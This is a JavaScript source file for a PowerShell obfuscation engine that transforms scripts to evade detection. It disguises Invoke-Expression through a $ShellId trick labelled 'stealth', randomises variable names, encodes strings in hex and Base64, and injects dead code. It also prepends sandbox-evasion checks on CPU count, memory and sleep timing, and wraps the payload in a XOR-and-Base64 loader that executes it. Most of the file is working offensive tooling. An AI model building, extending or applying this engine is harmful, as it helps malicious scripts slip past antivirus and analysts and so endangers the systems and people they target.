/**
 * PowerShell Obfuscation Engine (v2 — Context-Aware)
 *
 * FIXED:
 * - Removed string reverse [-1..-1] (breaks Unicode/Greek)
 * - Uses [char]0xXX and [System.Convert]::FromBase64String()
 * - Context-aware: only encodes string literals, never syntax
 * - Unicode detection → force Base64
 * - Dead code only injected at safe locations
 */

import { toBase64 } from '../utils/encoding'
import { randomVarName, randomFuncName, generateDeadCode, randomXorKey } from '../utils/randomization'
import { tokenize, tokensToCode, transformStrings, transformCodeOnly, hasUnicode, isSafeForInjection } from '../utils/parser'

const IEX_STEALTH = '& ($ShellId[1]+$ShellId[13]+\'X\')'

export function obfuscatePowerShell(code, layers = []) {
  if (!code || code.trim().length === 0) return { code: '', stealthApplied: false }

  let result = code
  let stealthApplied = false

  // FIRST: Global IEX Stealth — replace ALL IEX/Invoke-Expression BEFORE any encoding
  const stealthResult = applyIEXStealth(result)
  result = stealthResult.code
  stealthApplied = stealthResult.applied

  if (layers.includes('randomize')) {
    result = applyVariableRandomization(result)
  }
  if (layers.includes('encode')) {
    result = applyStringEncoding(result)
  }
  if (layers.includes('deadcode')) {
    result = applyDeadCodeInjection(result)
  }
  if (layers.includes('antianalysis')) {
    result = applyAntiAnalysis(result)
  }
  if (layers.includes('encrypt')) {
    result = applyEncryptionWrapper(result)
  }

  return { code: result, stealthApplied }
}

/* ── Global IEX Stealth (runs FIRST, context-aware) ──────── */

function applyIEXStealth(code) {
  const iexPatterns = [
    /\bInvoke-Expression\b/gi,
    /\bIEX\s*\(/gi,
    /\biex\s*\(/gi,
    /\bIEX\b/gi,
    /\biex\b/gi,
  ]

  let applied = false

  // Only replace in CODE tokens, never inside strings
  const result = transformCodeOnly(code, 'powershell', (codeSegment) => {
    let segment = codeSegment
    for (const pattern of iexPatterns) {
      if (pattern.test(segment)) {
        applied = true
        // Handle IEX( and iex( — keep the opening paren
        segment = segment.replace(/\b[Ii][Ee][Xx]\s*\(/g, IEX_STEALTH + ' (')
        // Handle Invoke-Expression
        segment = segment.replace(/\bInvoke-Expression\b/gi, IEX_STEALTH)
        // Handle standalone IEX (not followed by paren, already handled above)
        segment = segment.replace(/\b[Ii][Ee][Xx]\b(?!\s*\()/g, IEX_STEALTH)
        break
      }
    }
    return segment
  })

  return { code: result, applied }
}

/* ── Variable Randomization (context-aware) ──────────────── */

function applyVariableRandomization(code) {
  const reserved = new Set([
    'null', 'true', 'false', 'args', 'input', 'PSCommandPath',
    'PSScriptRoot', 'MyInvocation', 'ErrorActionPreference', '_',
    'env', 'Host', 'PWD', 'HOME', 'PSVersionTable', 'LASTEXITCODE',
    'Error', 'Matches', 'ForEach', 'switch', 'process', 'begin', 'end',
  ])

  // First pass: collect variables from CODE tokens only
  const tokens = tokenize(code, 'powershell')
  const varMap = {}

  for (const token of tokens) {
    if (token.type !== 'code') continue
    const varPattern = /\$([a-zA-Z_][a-zA-Z0-9_]*)/g
    let match
    while ((match = varPattern.exec(token.value)) !== null) {
      const varName = match[1]
      if (!reserved.has(varName) && !reserved.has(varName.toLowerCase()) && !varMap[varName]) {
        varMap[varName] = randomVarName('short')
      }
    }
  }

  if (Object.keys(varMap).length === 0) return code

  // Second pass: replace ONLY in code tokens
  return transformCodeOnly(code, 'powershell', (codeSegment) => {
    let result = codeSegment
    const sortedVars = Object.keys(varMap).sort((a, b) => b.length - a.length)
    for (const varName of sortedVars) {
      const regex = new RegExp('\\$' + varName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '\\b', 'g')
      result = result.replace(regex, '$' + varMap[varName])
    }
    return result
  })
}

/* ── String Encoding (context-aware, Unicode-safe) ───────── */

function applyStringEncoding(code) {
  const tokens = tokenize(code, 'powershell')

  const transformed = transformStrings(tokens, (content, quoteChar) => {
    // Skip here-strings — return unchanged
    if (quoteChar === '@"' || quoteChar === "@'") {
      return `@${quoteChar[1]}${content}${quoteChar[1]}@`
    }

    // Skip single-quoted strings (PowerShell literal strings)
    if (quoteChar === "'") {
      return `'${content}'`
    }

    // Unicode detected → force Base64
    if (hasUnicode(content)) {
      const b64 = toBase64(content)
      return `[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("${b64}"))`
    }

    // ASCII content — choose safe method
    const method = Math.floor(Math.random() * 3)
    switch (method) {
      case 0: {
        // [char]0xHH concatenation
        const chars = Array.from(content)
          .map((c) => `[char]0x${c.charCodeAt(0).toString(16).padStart(2, '0')}`)
          .join('+')
        return `(${chars})`
      }
      case 1: {
        // Format operator: ("{0}{1}" -f "part1","part2")
        const chunkSize = Math.max(2, Math.ceil(content.length / 4))
        const parts = []
        for (let i = 0; i < content.length; i += chunkSize) {
          parts.push(content.substring(i, i + chunkSize))
        }
        const formatStr = parts.map((_, i) => `{${i}}`).join('')
        const args = parts.map((p) => `"${p}"`).join(',')
        return `("${formatStr}" -f ${args})`
      }
      case 2: {
        // Base64 decode
        const b64 = toBase64(content)
        return `[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("${b64}"))`
      }
      default:
        return `"${content}"`
    }
  })

  return tokensToCode(transformed)
}

/* ── Dead Code Injection (safe locations only) ───────────── */

function applyDeadCodeInjection(code) {
  const lines = code.split('\n')
  const result = []

  for (let i = 0; i < lines.length; i++) {
    result.push(lines[i])
    if (i > 0 && i % (3 + Math.floor(Math.random() * 3)) === 0) {
      if (isSafeForInjection(lines[i], 'powershell')) {
        result.push(generateDeadCode('powershell'))
      }
    }
  }

  return result.join('\n')
}

/* ── Anti-Analysis ───────────────────────────────────────── */

function applyAntiAnalysis(code) {
  const v1 = randomVarName('short')
  const v2 = randomVarName('short')
  const v3 = randomVarName('short')
  const sleepMs = 1000 + Math.floor(Math.random() * 4000)

  const antiAnalysis = `# Environment validation
$${v1} = (Get-WmiObject -Class Win32_ComputerSystem).NumberOfLogicalProcessors
if ($${v1} -lt 2) { exit }
$${v2} = (Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory
if ($${v2} -lt 2GB) { exit }
$${v3} = [System.DateTime]::Now
Start-Sleep -Milliseconds ${sleepMs}
if (([System.DateTime]::Now - $${v3}).TotalMilliseconds -lt ${Math.floor(sleepMs * 0.8)}) { exit }
`

  return antiAnalysis + '\n' + code
}

/* ── Encryption Wrapper ──────────────────────────────────── */

function applyEncryptionWrapper(code) {
  const key = randomXorKey(16)
  const encoded = toBase64(code)
  const keyVar = randomVarName('short')
  const dataVar = randomVarName('short')
  const decodedVar = randomVarName('short')
  const funcName = randomFuncName()

  const xorEncoded = Array.from(encoded)
    .map((c, i) => c.charCodeAt(0) ^ key[i % key.length])

  return `# Encrypted payload wrapper
$${keyVar} = @(${key.join(',')})
$${dataVar} = @(${xorEncoded.join(',')})

function ${funcName}($d, $k) {
    $r = @()
    for ($i = 0; $i -lt $d.Length; $i++) {
        $r += [byte]($d[$i] -bxor $k[$i % $k.Length])
    }
    return [System.Text.Encoding]::ASCII.GetString($r)
}

$${decodedVar} = ${funcName} $${dataVar} $${keyVar}
& ( $ShellId[1]+$ShellId[13]+'x') ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($${decodedVar})))
`
}
